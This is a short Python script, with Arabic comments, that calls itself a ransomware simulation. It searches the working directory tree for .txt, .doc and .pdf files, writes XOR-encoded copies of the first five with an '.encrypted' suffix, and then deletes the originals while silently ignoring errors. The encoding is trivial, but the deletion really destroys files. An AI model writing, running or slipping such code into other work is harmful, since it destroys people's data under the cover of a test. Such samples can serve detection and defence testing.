
import time
import random
import os

# محاكاة Ransomware - تشفير الملفات
def ransomware():
    # البحث عن الملفات
    files = []
    for root, dirs, filenames in os.walk('.'):
        for filename in filenames:
            if filename.endswith(('.txt', '.doc', '.pdf')):
                files.append(os.path.join(root, filename))
    
    # تشفير الملفات
    for file_path in files[:5]:  # فقط 5 ملفات للاختبار
        try:
            with open(file_path, 'rb') as f:
                data = f.read()
            
            # محاكاة التشفير
            encrypted = bytes([b ^ 0x42 for b in data])
            
            with open(file_path + '.encrypted', 'wb') as f:
                f.write(encrypted)
            
            time.sleep(random.uniform(0.1, 0.3))
        except:
            pass
    
    # حذف الملفات الأصلية
    for file_path in files[:5]:
        try:
            if os.path.exists(file_path):
                os.remove(file_path)
        except:
            pass
    
    print("تم التشفير")

if __name__ == "__main__":
    ransomware()
